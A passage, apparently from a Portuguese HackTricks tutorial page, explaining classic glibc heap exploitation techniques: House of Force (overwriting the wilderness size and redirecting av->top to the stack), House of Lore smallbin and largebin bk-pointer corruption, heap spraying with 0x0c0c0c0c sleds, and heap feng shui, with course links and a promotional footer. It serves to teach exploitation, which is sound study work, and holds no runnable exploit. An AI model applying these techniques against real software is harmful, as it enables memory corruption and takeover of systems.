O primeiro passo √© sobrescrever o tamanho do chunk wilderness com um valor muito grande (0xffffffff), para que qualquer solicita√ß√£o de mem√≥ria grande seja tratada em \_int\_malloc() sem a necessidade de expandir o heap.

O segundo passo √© alterar o av->top para apontar para uma √°rea de mem√≥ria sob o controle do atacante, como a pilha. Em av->top, ser√° colocado \&EIP - 8.

Devemos sobrescrever av->top para apontar para a √°rea de mem√≥ria sob o controle do atacante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim obt√©m o valor da dire√ß√£o do chunk wilderness atual (o av->top atual) e remainder √© exatamente a soma dessa dire√ß√£o mais a quantidade de bytes solicitados por malloc(). Portanto, se \&EIP-8 estiver em 0xbffff224 e av->top contiver 0x080c2788, ent√£o a quantidade que precisamos reservar no malloc controlado para que av->top aponte para $EIP-8 para o pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

Assim, o valor alterado ser√° armazenado em av->top e o pr√≥ximo malloc apontar√° para o EIP e poder√° ser sobrescrito.

√â importante que o tamanho do novo chunk wilderness seja maior que a solicita√ß√£o feita pelo √∫ltimo malloc(). Ou seja, se o wilderness estiver apontando para \&EIP-8, o tamanho ficar√° exatamente no campo EBP da pilha.

**The House of Lore**

**Corrup√ß√£o SmallBin**

Os chunks liberados s√£o inseridos no bin com base em seu tamanho. Mas antes de serem inseridos, eles s√£o armazenados em unsorted bins. Quando um chunk √© liberado, ele n√£o √© imediatamente colocado em seu bin, mas permanece em unsorted bins. Em seguida, se um novo chunk for alocado e o anterior liberado puder ser usado, ele ser√° retornado, mas se um chunk maior for alocado, o chunk liberado em unsorted bins ser√° colocado em seu bin apropriado.

Para alcan√ßar o c√≥digo vulner√°vel, a solicita√ß√£o de mem√≥ria deve ser maior que av->max\_fast (normalmente 72) e menor que MIN\_LARGE\_SIZE (512).

Se houver um chunk no bin do tamanho adequado ao solicitado, ele ser√° retornado ap√≥s ser desvinculado:

bck = victim->bk; Aponta para o chunk anterior, √© a √∫nica informa√ß√£o que podemos alterar.

bin->bk = bck; O pen√∫ltimo chunk se torna o √∫ltimo, e se bck apontar para a pilha, o pr√≥ximo chunk alocado receber√° esse endere√ßo.

bck->fd = bin; A lista √© fechada fazendo com que ele aponte para bin

S√£o necess√°rios:
Reserve dois mallocs, de modo que o primeiro possa sofrer overflow ap√≥s o segundo ter sido liberado e inserido em seu bin (ou seja, um malloc maior que o segundo deve ser reservado antes do overflow).

O malloc reservado com o endere√ßo escolhido pelo atacante deve ser controlado pelo atacante.

O objetivo √© o seguinte: se pudermos fazer um overflow em um heap que tem um peda√ßo liberado e em seu bin abaixo, podemos alterar seu ponteiro bk. Ao alterar o ponteiro bk e se esse peda√ßo se tornar o primeiro da lista do bin e for reservado, o bin ser√° enganado e informado de que o pr√≥ximo peda√ßo da lista est√° na falsa dire√ß√£o que definimos (como stack ou GOT, por exemplo). Portanto, se outro peda√ßo for reservado e o atacante tiver permiss√µes nele, um peda√ßo na posi√ß√£o desejada ser√° fornecido e poder√° ser escrito.

Ap√≥s liberar o peda√ßo modificado, √© necess√°rio reservar um peda√ßo maior do que o liberado, para que o peda√ßo modificado saia dos bins n√£o ordenados e seja inserido em seu bin.

Uma vez no bin, √© hora de modificar o ponteiro bk atrav√©s do overflow para apontar para o endere√ßo que desejamos sobrescrever.

Assim, o bin deve esperar at√© que malloc() seja chamado v√°rias vezes para que o bin modificado seja usado novamente e engane o bin, fazendo-o acreditar que o pr√≥ximo peda√ßo est√° na dire√ß√£o falsa. Em seguida, o peda√ßo desejado ser√° fornecido.

Para que a vulnerabilidade seja explorada o mais r√°pido poss√≠vel, o ideal seria: reservar o peda√ßo vulner√°vel, reservar o peda√ßo a ser modificado, liberar esse peda√ßo, reservar um peda√ßo maior do que o a ser modificado, modificar o peda√ßo (vulnerabilidade), reservar um peda√ßo do mesmo tamanho do vulnerado e reservar um segundo peda√ßo do mesmo tamanho, que apontar√° para o endere√ßo escolhido.

Para proteger esse ataque, √© usada a verifica√ß√£o t√≠pica de que o peda√ßo "n√£o" √© falso: verifica-se se bck->fd est√° apontando para a v√≠tima. Ou seja, no nosso caso, se o ponteiro fd* do peda√ßo falso apontado na pilha est√° apontando para a v√≠tima. Para contornar essa prote√ß√£o, o atacante deve ser capaz de escrever de alguma forma (provavelmente na pilha) no endere√ßo correto da v√≠tima. Para que pare√ßa um peda√ßo verdadeiro.

**Corrup√ß√£o LargeBin**

S√£o necess√°rios os mesmos requisitos que antes e alguns adicionais, al√©m disso, os peda√ßos reservados devem ser maiores que 512.

O ataque √© semelhante ao anterior, ou seja, √© necess√°rio modificar o ponteiro bk e todas essas chamadas para malloc(), mas tamb√©m √© necess√°rio modificar o tamanho do peda√ßo modificado de forma que esse tamanho - nb seja < MINSIZE.

Por exemplo, √© necess√°rio definir o tamanho como 1552 para que 1552 - 1544 = 8 < MINSIZE (a subtra√ß√£o n√£o pode ser negativa porque √© comparada com um valor n√£o assinado).

Al√©m disso, foi introduzido um patch para tornar o ataque ainda mais complicado.

**Heap Spraying**

Basicamente consiste em reservar toda a mem√≥ria poss√≠vel para heaps e preench√™-los com um colch√£o de nops seguido de uma shellcode. Al√©m disso, o colch√£o √© preenchido com 0x0c. A ideia √© tentar pular para o endere√ßo 0x0c0c0c0c e, assim, se alguma dire√ß√£o for sobrescrita com esse colch√£o, o controle ser√° transferido para l√°. Basicamente, a t√°tica √© reservar o m√°ximo poss√≠vel para ver se algum ponteiro √© sobrescrito e pular para 0x0c0c0c0c, esperando que haja nops l√°.

**Heap Feng Shui**

Consiste em, por meio de reservas e libera√ß√µes, organizar a mem√≥ria de forma que peda√ßos reservados fiquem entre peda√ßos livres. O buffer a ser estourado ser√° colocado em um desses peda√ßos.

## Cursos Interessantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Refer√™ncias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Aprenda hacking AWS do zero ao hero com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
